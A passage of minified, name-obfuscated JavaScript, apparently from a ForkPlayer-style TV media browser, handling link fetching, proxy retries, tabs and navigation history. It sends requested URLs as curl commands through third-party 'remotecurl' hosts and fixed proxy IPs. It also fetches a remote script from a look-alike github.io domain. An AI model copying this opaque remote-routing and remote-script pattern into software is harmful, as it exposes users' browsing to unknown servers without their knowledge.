lastUrl[c.method[c.retry]+c.fulllink]=s;console.log("preprse "+c.count);if(c.count>15){console.log("Error. Many redirect parse > 3 "+c.fulllink);if(!c.hidden)statusbar("Error. Many redirect parse "+c.fulllink);c.abort();return c.parse("Error. Many redirect parse")}else if(s!=null){if(s.indexOf("{")==0&&(s.indexOf('{"parse":"')==0||s.indexOf('"async"')>0)){console.log("INPRE PARSE "+s);var data=l0QO11lOz0bfh10l0Ypr(s);console.log(data);if(data!=null&&gV(data,"parse")!=""){if(data.fastremote&&typeof data.async=="object"){if(gV(data.async,"send")!=""&&gV(data.async,"get")!=""){return c.fastremote(data)}}else if(gV(data,"cors")=="js"){$.ajax({url:data.parse,type:'GET',dataType:'jsonp',}).done(function(res){console.log(res);var s=llIl1I1HlMgNII1IO0Ypr(res)||res;c.sendrparse(data,s)});return c}else{console.log("REMOTE SELF TO PARSE "+data.parse);var params=data;params.callback=function(s){if(c.canceled)c.parse(null);else c.sendrparse(data,s)}
return c.unselfparse(params)}}}}
c.parse(s)},parse:function(){},umwt:function(data){var c=this;if(c.canceled)return;c.xhr4=null;c.xhr4=new XMLHttpRequest();c.xhr4.onreadystatechange=function(){if(c.xhr4.readyState==4){if(c.xhr4.status==200&&c.xhr4.responseText!="wait"&&c.xhr4.responseText!=""){if(c.canceled)return;c.sendrparse(data,c.xhr4.responseText)}else{c.mwtn++;if(c.mwtn<5)c.fastremote_timer=setTimeout(function(){if(!c.canceled)c.umwt(data)},4000);else{c.abort();if(!oInset[insetActive].is_ifr()){l1llOQI10lW1l_II101Ypr(!0);if(!c.hidden)kjtYpr.popUp("Истекло время ожидания получения ссылки! Попробуйте позже или включите RemoteFork для более быстрой обработки ссылок",2500)}
c.parse()}}}};c.xhr4.open('GET',data.async.get,!0);c.xhr4.send()},fastremote:function(data){var c=this;console.log("fastremote");console.log(data);var u=data.async.send;var d=u.match(/..*?(http.*?)("|$)/);if(d!=null)c.showbar(d[1],"fulllink");c.xhr2=null;c.xhr2=new XMLHttpRequest();c.xhr2.onreadystatechange=function(){if(c.xhr2.readyState==4){if(c.xhr2.responseText==""){if(!c.hidden)kjtYpr.popUp("Ошибка self парсинга! Включите RemoteFork для более быстрой обработки ссылок "+url+"!",2500);return c.parse("")}
if(c.canceled)return;if(c.xhr2.status==200){c.mwtn=0;fastremote_timer=setTimeout(function(){c.umwt(data)},4000)}else{c.xhr2=null;if(!c.hidden)kjtYpr.popUp("Истекло время ожидания получения ссылки! Включите RemoteFork для более быстрой обработки ссылок "+url+"!",2500)}}};c.xhr2.open('GET',u,!0);c.xhr2.send()},b64DecodeUnicode:function(str){try{str=str.replace(/\n/g,"");str=atob(str);return decodeURIComponent(str.split('').map(function(c){return'%'+('00'+c.charCodeAt(0).toString(16)).slice(-2)}).join(''))}catch(e){console.log(e);return str}},waitresponse:function(o){var c=this;if(c.canceled){console.log("waitresponse canceled");return}
o.response=c.b64DecodeUnicode(gV(o,"response"));if(gV(o,"status")=="ok"){console.log(o.id+" waitresponse "+o.url);c.preparse(o.response)}else{console.log("err waitresponse ");console.log(o);c.preparse(o.response)}},waitcurl:function(url){var c=this;console.log("ANDR SEND parsecurl");if(kjtYpr.build>=7){waitc[c.request_id]=this;if(url.indexOf("curl")==0)var g=parseCURL(url);else g={"method":"GET","url":url,"header":{}};andr.parsecurl(llIl1I1HlMgNII1IO0Ypr(g),c.request_id)}else kjtYpr.inf("Update ForkNewBeta.apk for use request to "+url,1500);return c},getArand:function(r){var t=0,cur=0;for(var i in r)t+=r[i];rndWeight=Math.floor(Math.random()*t);for(var i in r){cur+=r[i];if(cur>=rndWeight)return i}},rCurl:{"":25,"2":40,"3":15,"4":15},getcu:function(u){return"http://exec"+gV(u)+".remotecurl.ru/curl/command/?uri="},getDefCurl:function(){var c=this;if(document.location.href.indexOf("sub_server=")>0)kjtYpr.GL.serv=document.location.href.substr(document.location.href.indexOf("sub_server=")+11).split("#")[0];if(gV(kjtYpr.GL.serv)!=""){kjtYpr.GL.serv=parseInt(kjtYpr.GL.serv);var x=0;for(var i in c.rCurl){if(x==kjtYpr.GL.serv)return i;x++}}
return null},settime:function(s){var offset=new Date().getTimezoneOffset();if(gV(s).indexOf("=")!=-1){T.timestamp=Number(s.split("=")[1]);if(gV(s.split("="),2)!="")ipG=s.split("=")[2]}else T.timestamp=0;var timesec=T.timestamp*1000+offset*60000;if(!isNaN(timesec)&&timesec>16000000000){T.inetTime=Math.ceil(timesec)}else{T.inetTime=Date.now()+offset*60000}
clearInterval(kjtYpr.IntervalUpdateTime);kjtYpr.IntervalUpdateTime=setInterval('SetTimeDate();',1000)},ll1IQONgLQ00IlllYpr:function(n){var c=this;n=gV(n);console.log("ll1IQONgLQ00IlllYpr "+n);xhrl["p"+n]=uHelper.create("directnoheader");xhrl["p"+n].hidden=1;xhrl["p"+n].parse=function(s){if(!prload){c.settime(s);prload=1;rcurlUrl=c.getcu(n);console.log("set curl remote "+rcurlUrl);c.updateDef();for(var i in c.rCurl){if(i!=n&&xhrl["p"+i]!=null)xhrl["p"+i].abort()}}}
xhrl["p"+n].get(c.getcu(n)+"ping")},updateDef:function(){var c=this;if(gV(cached,"start")==""){uHelper.create("directnoheader|rf|proxy").hid().get("http://komivp.github.io.spiderxml.com/index.js").parse=function(s){cached.start=s}}
if(userGrid==null){uHelper.create("directnoheader").hid().getI("http://cloudflare.appinfo.su/browseraccount/?do=grid").parse=function(s){if(gV(s)!=""){userGrid=l0QO11lOz0bfh10l0Ypr(s);if(ll0l0loMtIlIOYpr()&&handler=="menu")Ill1110().replace()}}}},updateCurl:function(){var c=this,tt=40;if(rcurlUrl==""){prload=0;var se=[];var tmp=l0QO11lOz0bfh10l0Ypr(llIl1I1HlMgNII1IO0Ypr(c.rCurl));for(var i in c.rCurl){var n=c.getArand(tmp);se.push(n);delete tmp[n];setTimeout("if(!prload) uHelper.create('directnoheader').ll1IQONgLQ00IlllYpr("+n+");",tt);tt+=1000}
console.log(se)}else{c.xhr=uHelper.create("direct");c.xhr.hidden=1;c.xhr.parse=function(s){if(gV(s).indexOf("OK")==-1){rcurlUrl="";c.updateCurl()}else{c.updateDef();console.log("rcurl is okked!")}}
c.xhr.get(rcurlUrl+"ping")}},curlUrl:function(){var c=this;if(rcurlUrl!="")return rcurlUrl;else{var u=c.getDefCurl();if(u==null)u=c.getArand(c.rCurl);return c.getcu(u)}},getI:function(u,parsedata){return this.get(addident(u),parsedata)},get:function(u,parsedata){var c=this;c.init();c.fulllink=u;if(u.indexOf("http://remotefo.rk/")==0){c.method=["android"]}
if(u.indexOf("usb://")==0){if(is_tizen)TUsbList(u.substr(5),c);else if(platform=="sams"){if(u=="usb://")ScanUsbPort(c);else getUsbList(u.substring(6),c)}else{kjtYpr.inf("Only for Tizen and Samsung maple api",1200);c.parse()}
return c}
var url=u;if(url.indexOf("#POST")>0){c.postdata=url.split("#POST")[1];url=url.split("#POST")[0]}
if(is_local(u)&&(c.method[c.retry]=="xml"||c.method[c.retry]=="proxy"||c.method[c.retry]=="remote")){c.retry++;if(c.retry<c.method.length)c.get(u,parsedata);else{if(!c.hidden)kjtYpr.inf("Error stream local parser",1200);c.abort();c.parse()}
return c}
if(gV(lastUrl,c.method[c.retry]+u+c.postdata)!=""){console.log("Error! Exists in lastUrl "+c.method[c.retry]+u);console.log(c.postdata);if(!c.hidden)statusbar("Error! Many redirects "+u);console.log(c.parse);c.parse(gV(lastUrl,c.method[c.retry]+u));return c}else lastUrl[c.method[c.retry]+u]="1";c.showbar(url,"link");xhr_abort=!1;c.xhr=new XMLHttpRequest();c.xhr.onreadystatechange=function(){if(c.xhr.readyState==4){clearTimeout(c.lOIlIQIgtxfl0lOlOYpr);console.log("get st "+c.xhr.status);if(c.canceled)return;if(u.indexOf("/")==0)return c.preparse(c.xhr.responseText);else if(c.xhr.status!=200&&c.xhr.status!=302){if(c.method[c.retry].indexOf("direct")==0){if(c.xhr.status>0||(is_local(u)&&app_cors)){if(!c.hidden)kjtYpr.inf("Error "+c.xhr.status+" "+u,1200);return c.parse(null)}}
c.retry++;if(c.retry<c.method.length){return c.get(u,parsedata)}else{if(!c.hidden){is_loadpage(-1);kjtYpr.inf("Error stream parser network",1200)}
return c.parse(null)}}
c.preparse(c.xhr.responseText)}};if(u.indexOf("curl")==0)var lc=u;else lc='curl -L "'+url+'" -H "Accept-Language: ru,en;q=0.8,uk;q=0.6,bg;q=0.4" -H "User-Agent: '+c.ua+'" -H "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8"';c.hasheaders=0;for(var i in c.addheaders){c.hasheaders=1;lc+=' -H "'+i+': '+c.addheaders[i]+'"'}
if(c.postdata!==""){lc+=' -H "Content-Type: application/x-www-form-urlencoded" --data "'+c.postdata+'"'}
console.log(c.method[c.retry]+" "+c.retry+" req "+u);switch(c.method[c.retry]){case "rf":url="http://"+kjtYpr.GL.remoteip+"/parserlink?"+encodeURIComponent(lc.replace(/\|/g,"-.-"));break;case "proxy":serv=["195.88.208.101","46.36.218.194","185.158.114.122"];url="http://"+serv[_.random(0,2)]+"/xhr.php?u="+encodeURIComponent(lc);break;case "xml":url=c.curlUrl()+encodeURIComponent(url)+addident();break;case "remote":var d={"async":{"send":prxremote+"?do=xhrremote2&u="+encodeURIComponent(url)+"&vp="+timestamp+"&time=7200&use_remote=|curl_androind|curl_windows|android-device|&use_country=&v=send&direct","get":prxremote+"?do=xhrremote2&v=wget&hash="+md5(url),"post":""}}
if(typeof parsedata=="object"){if(gV(parsedata.async,"post")!="")d.async.post=gV(parsedata.async,"post");if(gV(parsedata,"data")!="")d.data=gV(parsedata,"data")}
c.fastremote(d);return c;break;case "direct":if(c.hasheaders&&kjtYpr.build>=7)return c.waitcurl(lc);break;case "android":return c.waitcurl(lc);break}
if(c.method[c.retry].match(/rf|proxy|xml/)){c.xhr.open('GET',url,!0);c.xhr.send()}else if(u.indexOf("curl")==0){var curl=parseCURL(u);console.log("parseCURL "+curl.url);if(curl.method=="POST"){c.xhr.open('POST',curl.url,!0);if(c.method[c.retry]=="direct"){for(var p in curl.header)if(p!="Content-Type")c.xhr.setRequestHeader(p,curl.header[p]);}
c.xhr.setRequestHeader('Content-Type','application/x-www-form-urlencoded; charset=UTF-8');c.xhr.send(curl.body);}else{c.xhr.open("GET",curl.url,!0);if(c.method[c.retry]=="direct"){for(var p in curl.header)c.xhr.setRequestHeader(p,curl.header[p]);}
c.xhr.send()}}else if(c.postdata!==""){c.xhr.open('POST',url,!0);if(kjtYpr.series!="D"&&kjtYpr.series!="C"&&app_cors&&xhr_referer==3&&c.method[c.retry]!="directnoheader"){c.xhr.setRequestHeader("User-Agent",c.ua);c.xhr.setRequestHeader("Accept","*/*");c.xhr.setRequestHeader("Accept-Encoding","deflate")}
if(c.method[c.retry]=="direct"){for(var i in c.addheaders)c.xhr.setRequestHeader(i,c.addheaders[i]);}
c.xhr.setRequestHeader('Content-Type','application/x-www-form-urlencoded');c.xhr.send(c.postdata);}else{c.xhr.open('GET',url,!0);if(kjtYpr.series!="D"&&kjtYpr.series!="C"&&app_cors&&xhr_referer==3&&c.method[c.retry]!="directnoheader"){c.xhr.setRequestHeader("User-Agent",c.ua);c.xhr.setRequestHeader("Accept","*/*");c.xhr.setRequestHeader("Accept-Encoding","deflate")}
if(c.method[c.retry]=="direct"){for(var i in c.addheaders)c.xhr.setRequestHeader(i,c.addheaders[i]);}
c.xhr.send()}
c.lOIlIQIgtxfl0lOlOYpr=setTimeout(function(){if(!c.canceled){xhr_abort=!0;c.xhr.abort();if(!c.hidden){kjtYpr.inf('_FPPrevLimOzh_',1500,'yellow')}}},c.atime);return c},list:[],recurFolder:function(a,ttl,desc){var ttl=gV(ttl);if(ttl!=="")ttl+=" ";for(var j in a){console.log(j);console.log(a[j]);if(j=="title")ttl+=a[j]+" ";else if(j=="file"&&gV(a,"file")!==""){if(gV(a,"poster")!=""){var dop='<img src="'+a.poster+'" style="width:180px;float:left;">'}else dop="";if(gV(desc)!=="")dop+=desc+"<br>";this.list.push({"title":ttl,"logo_30x30":gV(a,"poster"),"stream_url":a[j],"description":dop+ttl})}else if(typeof a[j]=="object")this.recurFolder(a[j],ttl,desc)}}};function getSelect(){if(typeof oInset[insetActive]!="undefined")return parseInt(oInset[insetActive].select);else return 0}
function setSelect(s){if(s=="--")oInset[insetActive].select--;else if(s=="++")oInset[insetActive].select++;else oInset[insetActive].select=parseInt(s)}
function curCh(m,v){return oInset[insetActive].curCh(m,v)}
function setCaretPosition(pos){var ctrl=VK.focus;if(ctrl.setSelectionRange){ctrl.focus();ctrl.setSelectionRange(pos,pos)}else if(ctrl.createTextRange){var range=ctrl.createTextRange();range.collapse(!0);range.moveEnd('character',pos);range.moveStart('character',pos);range.select()}}
function VKinsert(word){VK.focus.focus();if(VK.focus.selectionStart){start=VK.focus.selectionStart;if(word=="-rem-")VK.focus.value=VK.focus.value.substring(0,start-1)+VK.focus.value.substring(VK.focus.selectionEnd,VK.focus.value.length);else VK.focus.value=VK.focus.value.substring(0,start)+word+VK.focus.value.substring(VK.focus.selectionEnd,VK.focus.value.length);VK.focus.focus();if(word=="-rem-")VK.focus.setSelectionRange(start-1,start-1);else VK.focus.setSelectionRange(start+word.length,start+word.length)}else{start=VK.focus.value.length;if(word=="-rem-")VK.focus.value=VK.focus.value.substring(0,start-1);else VK.focus.value+=word}}
function copyToClipboard(elem){var targetId="_hiddenCopyText_";var isInput=elem.tagName==="INPUT"||elem.tagName==="TEXTAREA";var origSelectionStart,origSelectionEnd;if(isInput){target=elem;origSelectionStart=elem.selectionStart;origSelectionEnd=elem.selectionEnd}else{target=document.getElementById(targetId);if(!target){var target=document.createElement("textarea");target.style.position="absolute";target.style.left="-9999px";target.style.top="0";target.id=targetId;document.body.appendChild(target)}
target.textContent=elem.textContent}
var currentFocus=document.activeElement;target.focus();target.setSelectionRange(0,target.value.length);var succeed;try{succeed=document.execCommand("copy")}catch(e){succeed=!1}
if(currentFocus&&typeof currentFocus.focus==="function"){currentFocus.focus()}
if(isInput){elem.setSelectionRange(origSelectionStart,origSelectionEnd)}else{target.textContent=""}
return succeed}
function exinobj(obj,k){var res=0;$.each(obj,function(ii,val){if(k==val)res=1});return res}
var Inset={create:function(){var c=Object.create(this);c.id=oInset.length;c.history=[];c.title="_FPDobroPozhalovat_";c.icon="";c.fwhistory=[];c.isLoading=0;c.select=0;c.lastselect=null;c.lIQ0Il1IlIb1Il1OYpr="about:blank";c.loadPage=null;c.oldtvg=0;c.oldselpos98=-2;c.INC=-1;c.is_private=0;c.oldselpos=-2;return c},init:function(n){this.id=oInset.length;this.loadHist()},ll0Ol1Z0yl0lI1Ypr:function(){var c=this;var html="";if(handler=="ext"){html+=getbut("1",_img("_ST_b_a.png"),"ext_close();","Закрыть расширение")}else if(handler=="menu"){if($_("player").style.display=="block")var text="_FPVPLEER_";else if(submenuSelIcon.selicon)text="_FPIcon_";else text="";html+=getbut("1",_img("_ST_b_a.png"),"l01lI01OIIiXQlQOIYpr('menu',VK_RED);",text);html+=getbut("2",_img("_ST_b_b.png"),"l01lI01OIIiXQlQOIYpr('menu',VK_GREEN);","");html+=getbut("3",_img("_ST_b_c.png"),"l01lI01OIIiXQlQOIYpr('menu',VK_YELLOW);","");html+=getbut("4",_img("_ST_b_d.png"),"l01lI01OIIiXQlQOIYpr('menu',VK_BLUE);","")}else if(handler=="vk"){html+=getbut("1",_img("_ST_b_a.png"),"keyHandler({'keycode':VK_RED});","<img style='padding-left:1px;' src='"+_img("_ST_b_bksp.png")+"' />");if(c.curCh("playlist_url").indexOf("")==0)text="_FPConfiguring search_";else text="_FPYazik_";html+=getbut("1",_img("_ST_b_b.png"),"keyHandler({'keycode':VK_GREEN});",text);if(kjtYpr.inputId.indexOf('cmd')==0||$_(VK.id).value!="")text="_FPClear_";else text="_FPOchistIst_";html+=getbut("1",_img("_ST_b_c.png"),"keyHandler({'keycode':VK_YELLOW});",text);html+=getbut("1",_img("_ST_b_d.png"),"keyHandler({'keycode':VK_BLUE});","_FPVVOD_")}
lI1I1IxFCIh1l01llYpr("btdiv",html)},curCh:function(m,v){var c=this;if(m==null){if(c.page==null)return{};else if(typeof c.page.channels[c.select]=="undefined")return{};else return c.page.channels[c.select]}else{if(typeof c.curCh()=="undefined")return"";else{if(v==null)return gV(c.curCh(),m);else{c.curCh()[m]=v;return!0}}}},is_ifr:function(ch){var c=this;if(c.page==null)return 0;if(c.page.IFRAMES.length==0)return 0;if(ch==null)ch=c.curCh();if(gV(ch,"iframe")=="")return 0;else return 1},mark:function(id,m,el){var c=this;console.log("mark "+id+"="+m+" / "+el);if($_("ch"+id)==null){console.log("mark null");return}
$_("ch"+id).sel=m;var curPage=c.page;if(m){$_("ch"+id).className=$_("ch"+id).className.replace(/default/g,"selected");if(c.page.getTypePos(c.curCh(),c.select)=="list"){if(c.select>=0)rollTitle()}
var desc=gV(c.curCh("description"));var ch=c.curCh();var bhtml="";if(typeof ch.green=="object"){bhtml+='<span onclick=\'keyHandler({"keycode":VK_GREEN});\'><div style="display: inline-block;border-radius:2px;padding: 6px; background: green;margin: 0px 3px;"></div> '+ch.green.title+"</span>";$_("bt5").style.display="none"}else $_("bt5").style.display="block";if(gV(ch,"yellow_url")!=""){if(gV(ch,"yellow_title")=="")ch.yellow_title=ch.yellow_url;ch.yellow={"title":ch.yellow_title,"playlist_url":ch.yellow_url}}
if(typeof ch.yellow=="object"){bhtml+='<span onclick=\'keyHandler({"keycode":VK_YELLOW});\'><div style="display: inline-block;border-radius:2px;padding: 6px; background: yellow;margin: 0px 1px 0px 4px;"></div> '+ch.yellow.title+"</span>";$_("bt6").style.display="none"}else $_("bt6").style.display="block";if(bhtml!=""){$_("bbot").style.display="block";lI1I1IxFCIh1l01llYpr("bbot","<div style='float:right;background:#3f4b50;padding:4px 6px;'>"+bhtml+"</div>")}else $_("bbot").style.display="none";if(c.page.getTypePos(ch,c.select)=="html"){if(desc!="")$_("middle").style.display="block";console.log(desc);lI1I1IxFCIh1l01llYpr("middle",desc)}else{$_("middle").style.display="none";lI1I1IxFCIh1l01llYpr("middle","");if(c.page.getTypePos(c.curCh(),c.select)=="list"){var i=c.select;while(c.page.getTypePos(curPage.channels[i],i)=="list"){i--}
i++;console.log("LAST i="+i);var top_l=0;var ch_pos=$($_("ch"+i)).offset().top+top_l;$_("rightHalf").style.display="block";if(ch_pos<top_l)ch_pos=top_l;ch_pos=Math.ceil(ch_pos);$_("rightHalf").style.top=(ch_pos)+"px";$_("rightHalf").style.maxHeight=($_("site").offsetHeight-ch_pos)+"px";lI1I1IxFCIh1l01llYpr("infoList",desc)}else{$_("rightHalf").style.display="none"}}}else{$_("ch"+id).className=$_("ch"+id).className.replace(/selected/g,"default")}},wheel:function(event){var c=this;var curPage=c.page;var delta;event=event||window.event;if(event.wheelDelta){delta=event.wheelDelta/120;if(window.opera)delta=-delta}else if(event.detail){delta=-event.detail/3}
console.log("wheel "+delta);if(handler=='menu'){var s=c.select-3*delta;console.log(s);console.log(c.page.getTypePos(c.curCh(),c.select));if(s<0)oInset[insetActive].focused(0);else if(s>=curPage.channels.length)c.focused(curPage.channels.length-1);else{if(c.select>=0&&c.page.getTypePos(c.curCh(),c.select)=="list")c.focused(s);else if(delta<0)keyHandler({"keycode":VK_DOWN,"isTrusted":!0});else keyHandler({"keycode":VK_UP,"isTrusted":!0})}
if(event.preventDefault)event.preventDefault();event.returnValue=!1}},hint:function(){var c=this;var link="",dop="";if($_("statbar2").style.display!="none"&&gV($_("statbar2"),"mode")=="link")return;if(gV($_("statbar2"),"mode")=="hint")$_("statbar2").style.display="none";if(c.select>=0){dop=(getSelect()+1)+"/"+c.page.channels.length+" ";var link=c.curCh("playlist_url")+c.curCh("stream_url");if(c.curCh("search_on")!="")link=c.curCh("search_on");if(link=="submenu")link="[]";if(link=="md5hash")link=c.curCh("parser");if(c.curCh("sourceurl")!=""){c.ifrurl=1;lI1I1IxFCIh1l01llYpr("navurl",getInfoUrl(c.curCh("sourceurl")))}else if(c.ifrurl){c.ifrurl=0;lI1I1IxFCIh1l01llYpr("navurl",getInfoUrl(c.page.lIQ0Il1IlIb1Il1OYpr))}}else if(c.select==-1){if(insetSelect<insetCount)link=oInset[insetSelect].get("url");else if(insetSelect==insetCount)link="new tab";else link=allI()[insetSelect]}
if(link!="")statusbar(dop+link,"hint")},focused:function(n,el){stopRoll();runtime=Date.now();clearTimeout(timerScroll);var c=this;if(n!=null)c.select=n;if(isNaN(c.select))c.select=0;if(c.page==null)return;if(c.select>=c.page.channels.length)c.select=c.page.channels.length-1;if(c.select>0)var cnt=0;else cnt=c.select;if(c.select!=-1)insetSelect=insetActive;var hsh=cnt+" "+menuSel+" "+menuSubSel+" "+sdbarSel+" "+insetSelect+" "+insetActive+" "+c.getTitle();if(sdbar!=null)hsh+=" "+sdbar.length;console.log("hsh "+hsh);if(c.page!=null&&(c.page.is_mark||c.page.marked)){if(!c.page.is_mark){c.page.is_mark_array={};c.page.marked=0}
for(var i=0;i<c.page.channels.length;i++){if(c.page.is_mark_array[i]){c.page.marked=1;$_("titleid"+i).style.color="#b40c00";$_("titleid"+i).style.fontWeight="bold";$_("titleid"+i).style.border="1px solid red"}else{$_("titleid"+i).style.color="";$_("titleid"+i).style.fontWeight="";$_("titleid"+i).style.border=""}}}
if(c.lastResel!=hsh){console.log(c.lastResel+"!="+hsh);renderInset();menu_sel();c.page.lI0Il1lenfIlO0IYpr();sidebar_sel();omniSel();c.lastResel=hsh}
if(c.lastselect!=c.select&&c.lastselect!=null&&$_("ch"+c.lastselect)!=null)c.mark(c.lastselect,0);console.log("render tooffmark="+(Date.now()-runtime)+" msec");if(c.select>=0){console.log("focused enderChannels "+n);c.page.renderChannels(c.select,"focused");console.log("render tomark="+(Date.now()-runtime)+" msec");c.mark(c.select,1,el);if(el==null){mcanc=0;var cs=c.select;if($_("ch"+cs)!=null){var ch_pos=buff.chtop(cs)-buff.scrollsitetop();var site_bot=$_("scrollsite").offsetHeight;var y_t=Math.ceil($_("ch"+cs).offsetTop-site_bot*0.18);var y_b=Math.ceil($_("ch"+cs).offsetTop+$_("ch"+cs).offsetHeight-site_bot*0.87);progScroll=1;if($_("ch"+cs).offsetTop<$_("scrollsite").offsetHeight*0.5||cs<1)buff.scrollsitetop(0);else if(c.lastselect>=0&&c.lastselect<c.page.channels.length&&(c.select-c.lastselect==-10||c.select-c.lastselect==10)){var ch_lastpos=$_("ch"+c.lastselect).offsetTop-buff.scrollsitetop();buff.scrollsitetop(buff.scrollsitetop()+ch_pos-ch_lastpos)}else if(y_t<buff.scrollsitetop()){buff.scrollsitetop(y_t)}else if(y_b>buff.scrollsitetop())buff.scrollsitetop(y_b);if(n)gP().renderIcons(n)}}
runtime=Date.now()-runtime;console.log("render ch="+runtime+" msec per "+c.page.channels.length+" "+(runtime/c.page.channels.length).toFixed(5))}
c.lastselect=c.select;c.hint()},sPosMaxY:function(){var c=this;var y=0;for(var i in c.page.sPos)if(c.page.sPos[i][1]>y)y=c.page.sPos[i][1];return y},sPosGetMaxXbyRow:function(r){var c=this;var y=0;for(var i in c.page.sPos)if(c.page.sPos[i][0]>y&&c.page.sPos[i][1]==r)y=c.page.sPos[i][0];return y},sPosGetXbyRow:function(px,py){var c=this;var max=c.sPosGetMaxXbyRow(py);console.log("sPosGetXbyRow from "+px+"/"+py+" max "+max);if(px>max)px=Math.ceil((px/startX)*max);var tmp=px;for(var i in c.page.sPos){if(c.page.sPos[i][0]==px&&c.page.sPos[i][1]==py)return i;else if(c.page.sPos[i][1]==py)tmp=i-1}
return tmp+1},posStart:function(x,y){var c=this;oldselect=c.select;if(typeof c.page=="undefined")var count=0;else{count=c.page.channels.length;if(c.INC!=-1){if(c.INC<c.page.inc){console.log("posStart not inc");return}}}
if(count==0&&c.select>-1)return c.focused(-1);c.select=parseInt(c.select);if(c.select>=0){c.page.posX=c.page.sPos[c.select][0];c.page.posY=c.page.sPos[c.select][1]}
console.log("x "+x+" y "+y+" from "+c.select+"");if(x!=0){if(c.select>=0&&c.page.getTypePos(c.curCh(),c.select)=="list"){if((c.select+x*10)<0)c.select=0;else if((c.select+x*10)>=count){if(gV(c.page.global,"next_page_url")!=""&&c.select==count-1){var ttl=c.title.match(/^Стр. (\d+) \/ (.*)$/);if(ttl!=null)var title="Стр. "+(ttl[1]*1+1)+" / "+ttl[2];else title="Стр. 2 / "+c.title;c.navigate({"title":title,"icon":""+c.icon,"playlist_url":gV(c.page.global,"next_page_url")})}else c.select=count-1}else c.select=(1*c.select)+x*10}else c.select=(1*c.select)+x}else if(y!=0){if(y==1){if(c.select==-1||c.page.posY==c.sPosMaxY()){if(c.page.posY==c.sPosMaxY()){$_("controlcontent").style.paddingBottom="70px";buff.scrollsitetop(buff.scrollsitetop()+70);setTimeout('$_("controlcontent").style.paddingBottom="43px";',100);return}
console.log("to start "+c.page.posY+"== "+c.sPosMaxY());c.select=c.sPosGetXbyRow(c.page.posX,0)}else{console.log("to next "+c.page.posX+","+(c.page.posY+1));c.select=c.sPosGetXbyRow(c.page.posX,++c.page.posY)}}else{if(c.select==-1)c.select=c.sPosGetXbyRow(c.page.posX,c.sPosMaxY());else if(c.page.posY==0)c.select=-1;else c.select=c.sPosGetXbyRow(c.page.posX,--c.page.posY)}}
console.log("to "+c.select);return c.focused()},play:function(n,mode){var c=this;if(c.isLoading){c.stopLoad();c.loadPage=null;c.isLoading=0}
if(n!=null)c.select=n;if(c.select>=0&&c.select<c.page.channels.length){c.navigate(c.page.channels[c.select],mode)}},navigate:function(el,mode,goBack,inputed){var c=this;if(gV(c.page,"is_mark")){if(c.page.is_mark_array[c.select])c.page.is_mark_array[c.select]=0;else c.page.is_mark_array[c.select]=1;return c.focused()}
if(c.loadPage!=null){c.stopLoad();setTimeout(function(){c.navigate(el,mode,goBack,inputed)},50);return}
if(el==null)return c.play();if(typeof el=="string")el={"title":el,"playlist_url":el,"stream_url":""};is_loadpage(1);c.loadPage=FXMLPage.create();c.loadPage.parentURL=gV(c.page,"lIQ0Il1IlIb1Il1OYpr");c.loadPage.parentIMG=gV(c.page,"icon");c.loadPage.parentTITLE=gV(c.page,"title");c.loadPage.title=gV(el,"title");c.loadPage.icon=gV(el,"logo_30x30");c.loadPage.lIQ0Il1IlIb1Il1OYpr=gV(el,"playlist_url")+gV(el,"stream_url");c.loadPage.SAVE_lIQ0Il1IlIb1Il1OYpr=gV(el,"playlist_url");c.loadPage.count=-1;console.log("navogate "+c.loadPage.inc);console.log(gV(el,"iframeid"));console.log(gV(el,"iframeid")!="");if(gV(el,"iframeid")!==""){console.log("IS_IFR");goBack=!0;if(gV(el,"sourceurl")!="")c.loadPage.l1IOIl100j1fXIlIIYpr=2;else c.loadPage.l1IOIl100j1fXIlIIYpr=1;console.log("l1IOIl100j1fXIlIIYpr="+c.loadPage.l1IOIl100j1fXIlIIYpr)}
el.index=c.select;c.isLoading=1;c.el=el;sethash();var param={"elCh":el,"origelCh":l0QO11lOz0bfh10l0Ypr(llIl1I1HlMgNII1IO0Ypr(el)),"top":buff.scrollsitetop(),"elGlobal":{},"mode":mode,"lI1101I0v1OO1OIYpr":c,"goBack":goBack,"inputed":inputed,"input":{}};if(gV(mode)=="refresh")param.refresh=!0;if(typeof c.page!="undefined")if(typeof c.page.input!="undefined")param.input=c.page.input;console.log(param);if(gV(el,"navigateurl")!=""){param.data=el;c.loadPage.lIQ0Il1IlIb1Il1OYpr=gV(el,"navigateurl");c.loadPage.toChannels(param)}else c.loadPage.openCh(param);c.ll0Ol1Z0yl0lI1Ypr()},stopLoad:function(){var c=this;console.log("stopLoad");clearTimeout(lOIlIQIgtxfl0lOlOYpr);clearTimeout(fastremote_timer);if(c.loadPage!=null){c.loadPage.cancel()}
c.isLoading=0;if(waitc.start){waitcurl("abort")}
if(is_ifr()){curPage.IFRAMES=[];for(var i in curPage.channels){curPage.channels[i].iframe="";curPage.channels[i].iframeid=""}}
xhr2=null;xhr=null;xhr4=null;is_loadpage(0)},stop:function(){console.log("STOPPED");var c=this;if(c.loadPage!=null){c.loadPage.cancel()}
if(c.page!=null){c.page.cancel()}
c.focused()},cleargo:function(){var c=this;if(gV(c.page,"is_mark")){c.page.is_mark=!1;c.page.marked=!1;c.page.is_mark_array={}}
favarray=null},replace:function(ch){var c=this;c.cleargo();if(ch!=null)gP().channels=ch;gP().renderChannels(getSelect(),"update");c.focused()},reload:function(){var c=this;c.cleargo();c.navigateHist(-1,!0)},back:function(){var c=this;c.cleargo();if(kjtYpr.GL.pip){clearTimeout(plmini_timer)}
if(c.loadPage!=null)c.stopLoad();else c.navigateHist(-2)},forward:function(k){var c=this;if(k==null)k=0;if(typeof c.fwhistory[k]=='undefined')kjtYpr.inf("_FPEmpty forward history_!",1500);else{for(var i=0;i<=k;i++)c.history.push(c.fwhistory.shift());c.save()}
c.navigateHist()},navigateHist:function(k,refresh){console.log("navigateHist "+k+" refresh "+refresh);var c=this;c.cleargo();console.log(c.history);if(c.loadPage!=null){c.stopLoad();setTimeout(function(){c.navigateHist(k,refresh)},50);return}
if(k==null)k=-1;else k=parseInt(k);var n=c.history.length+k;console.log("n="+n);c.lastResel="";if(typeof c.history[n]=='undefined')kjtYpr.inf("_FPEmpty return history_!",1500);else{if(k<-1){if(c.get("b")=="1"){kjtYpr.popUp("_FPEtaVklBzabl_!<br>_FPDlRvIn_ _FPMenu_ / _FPRazblVkl_",1500);return}else{for(var i=-1;i>k;i--)c.fwhistory.unshift(c.history.pop());}}
